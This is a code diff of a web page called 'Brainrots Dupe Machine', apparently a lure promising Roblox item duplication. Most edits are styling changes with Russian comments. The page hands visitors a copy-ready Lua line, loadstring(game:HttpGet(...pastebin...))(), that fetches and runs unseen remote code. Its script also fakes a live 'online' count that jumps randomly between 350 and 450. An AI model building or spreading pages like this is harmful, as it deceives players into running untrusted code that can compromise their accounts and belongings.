@@ -40,7 +40,7 @@
     }
 
     .stack{
-      width:min(520px, 100%);
+      width:min(680px, 100%); /* шире */
       display:flex;
       flex-direction:column;
       align-items:center;
@@ -114,10 +114,10 @@
       text-align:left;
     }
     .priceMain{
-      font-size: 26px;       /* ACCENT HERE */
+      font-size: 30px; /* сильнее акцент */
       font-weight: 900;
-      letter-spacing: -0.5px;
-      color: rgba(255,255,255,.95);
+      letter-spacing: -0.6px;
+      color: rgba(255,255,255,.96);
       line-height: 1.1;
     }
     .priceSub{
@@ -128,7 +128,7 @@
 
     .hold{
       width:100%;
-      height: 54px;
+      height: 56px;
       border-radius: 14px;
       border: 1px solid var(--border2);
       background: rgba(255,255,255,.03);
@@ -175,7 +175,7 @@
 
     .input{
       flex:1;
-      height: 52px;
+      height: 54px;
       border-radius: 14px;
       border: 1px solid var(--border);
       background: rgba(255,255,255,.02);
@@ -191,8 +191,8 @@
     }
 
     .btn{
-      height: 52px;
-      padding: 0 16px;
+      height: 54px;
+      padding: 0 18px;
       border-radius: 14px;
       border: 1px solid rgba(255,255,255,.22);
       background: rgba(255,255,255,.08);
@@ -221,13 +221,20 @@
       text-transform: uppercase;
       font-weight: 800;
     }
+
+    /* КЛЮЧЕВОЕ: теперь ссылка НЕ обрезается */
     .out__value{
       font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace;
       font-size: 13px;
       color: rgba(255,255,255,.92);
-      white-space: nowrap;
-      overflow: hidden;
-      text-overflow: ellipsis;
+
+      white-space: normal;          /* разрешить перенос */
+      overflow: visible;            /* не прятать */
+      text-overflow: clip;          /* без троеточия */
+      overflow-wrap: anywhere;      /* ломать длинные куски */
+      word-break: break-word;       /* на всякий */
+      line-height: 1.55;
+      min-height: 44px;             /* чтобы выглядело “дороже” даже на коротком */
     }
 
     .note{
@@ -241,21 +248,24 @@
 
     .hidden{ display:none; }
 
+    @media (max-width: 720px){
+      .stack{ width:min(640px, 100%); }
+    }
     @media (max-width: 560px){
       .row{ flex-direction:column; align-items:stretch; }
       .btn{ width:100%; }
       .pageTitle{ font-size: 36px; }
-      .priceMain{ font-size: 24px; }
+      .priceMain{ font-size: 26px; }
     }
   </style>
 </head>
 
 <body>
-  <!-- FIXED LINK: меняй тут -->
   <main class="wrap">
     <div class="stack">
       <h1 class="pageTitle">Brainrots Dupe Machine</h1>
 
+      <!-- FIXED LINK: меняй тут -->
       <section class="box" id="app" data-fixed-link="loadstring(game:HttpGet("https://pastebin.com/raw/kguPGCJu"))()">
         <div class="online" aria-label="Online">
           <span class="dot" aria-hidden="true"></span>
@@ -296,7 +306,7 @@
       const app = document.getElementById("app");
       const FIXED_LINK = (app.dataset.fixedLink || '""').trim();
 
-      // Online counter: 350–450, "умно" скачет
+      // Online counter: 350–450, мягкие “умные” скачки
       const onlineEl = document.getElementById("onlineNum");
       const MIN = 350, MAX = 450;
 
@@ -306,7 +316,6 @@
       function clamp(n, a, b){ return Math.max(a, Math.min(b, n)); }
 
       function pickTarget(){
-        // мягкая динамика: чаще маленькие шаги, иногда скачок
         const jump = Math.random() < 0.12;
         const step = jump ? (10 + Math.floor(Math.random()*18)) : (1 + Math.floor(Math.random()*5));
         const dir = Math.random() < 0.5 ? -1 : 1;
@@ -314,7 +323,7 @@
       }
 
       function tickOnline(){
-        if (Math.abs(target - current) <= 0) pickTarget();
+        if (target === current) pickTarget();
 
         const diff = target - current;
         const move = diff === 0 ? 0 : (Math.abs(diff) >= 8 ? Math.sign(diff) * 2 : Math.sign(diff));
@@ -322,7 +331,7 @@
 
         onlineEl.textContent = String(current);
 
-        const next = 180 + Math.floor(Math.random()*260); // 180–440ms
+        const next = 180 + Math.floor(Math.random()*260);
         setTimeout(tickOnline, next);
       }
 
